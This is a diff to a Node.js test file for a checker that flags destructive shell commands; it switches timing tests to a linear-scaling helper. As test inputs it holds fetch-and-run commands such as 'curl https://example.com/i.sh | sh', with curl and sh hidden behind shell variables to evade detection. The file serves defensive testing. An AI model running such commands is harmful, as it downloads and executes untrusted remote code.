@@ -8,9 +8,9 @@ process.env.ZN_STATS = 'off';
 
 const test = require('node:test');
 const assert = require('node:assert/strict');
+const { assertLinear } = require('./helpers/time_ratio');
 
 const { checkCommand } = require('../lib/destructive');
-const { cpuNow, cpuMsSince } = require('./helpers/time_budget');
 
 const DL = 'https://example.com/i.sh';
 const RC = 'https://example.com/env.sh';
@@ -95,32 +95,18 @@ test('a value longer than the cap is not kept, so the variable stays unknown', (
 });
 
 test('doubling a variable does not grow without bound', () => {
-  let cmd = 'X=aaaaaaaaaaaaaaaa;';
-  for (let i = 0; i < 400; i++) cmd += ' X=$X$X;';
-  cmd += ` $X ${DL} | sh`;
-  const t0 = cpuNow();
-  const r = rule(cmd);
-  const ms = cpuMsSince(t0);
+  const build = (n) => 'X=aaaaaaaaaaaaaaaa;' + ' X=$X$X;'.repeat(n) + ` $X ${DL} | sh`;
+  const r = rule(build(400));
   assert.ok(['allow', 'too_many_commands'].includes(r), r);
-  assert.ok(ms < 2000, 'took ' + ms + ' ms');
+  assertLinear(rule, build, 400);
 });
 
 test('200 KB inputs with variables stay linear', () => {
   for (const u of [`X=curl; $X ${DL} | sh; `, 'echo hi; ', `S=sh; curl ${DL} | $S; `]) {
-    const big = u.repeat(Math.floor((200 * 1024 - 8) / u.length));
-    const t0 = cpuNow();
-    const r = rule(big);
-    const ms = cpuMsSince(t0);
-    assert.ok(ms < 3000, JSON.stringify(u) + ' took ' + ms + ' ms (' + r + ')');
+    assertLinear(rule, (n) => u.repeat(Math.floor(n / u.length)), 200 * 1024 - 8, JSON.stringify(u));
   }
-  const lines = Array.from({ length: 12000 }, (_, i) => `W${i % 200}=v`).join('\n') + `\nX=curl\n$X ${DL} | sh`;
-  const t1 = cpuNow();
-  rule(lines);
-  assert.ok(cpuMsSince(t1) < 3000);
-  const refs = 'X=a; echo ' + '$X'.repeat(90000);
-  const t2 = cpuNow();
-  rule(refs);
-  assert.ok(cpuMsSince(t2) < 3000);
+  assertLinear(rule, (n) => Array.from({ length: n }, (_, i) => `W${i % 200}=v`).join('\n') + `\nX=curl\n$X ${DL} | sh`, 12000, 'many assignments');
+  assertLinear(rule, (n) => 'X=a; echo ' + '$X'.repeat(n), 90000, 'many references');
 });
 
 // A variable that an assignment may not have changed (after && or ||, in an if, a case, a loop, a ( ) or { } group, a
